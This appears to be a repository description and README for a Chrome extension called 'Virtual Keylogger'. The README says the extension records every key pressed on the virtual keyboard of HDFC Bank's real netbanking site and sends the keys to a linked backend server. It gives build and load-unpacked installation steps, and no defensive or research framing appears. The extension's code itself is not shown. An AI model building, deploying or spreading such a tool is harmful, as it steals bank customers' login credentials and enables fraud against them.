summary: This is a simple keylogger for virtual keyboards on HDFC Bank's netbanking site, logging keys and sending data to a backend server.

details.comment: This is a simple keylogger for virtual keyboards on HDFC Bank's netbanking site, logging keys and sending data to a backend server.
details.content:
# Virtual Keylogger
This is a simple keylogger that logs all the keys pressed on the vitual keyboard on https://netbanking.hdfcbank.com and sends them to a backend server ([code available here](https://github.com/ayamdobhal/virtual-keylogger-backend)).
## How to run
- Build the index.js file
```
npm run build
```
- Open Chrome and go to `chrome://extensions`
- Enable developer mode
- Click on `Load unpacked` and select the folder you cloned the repository in
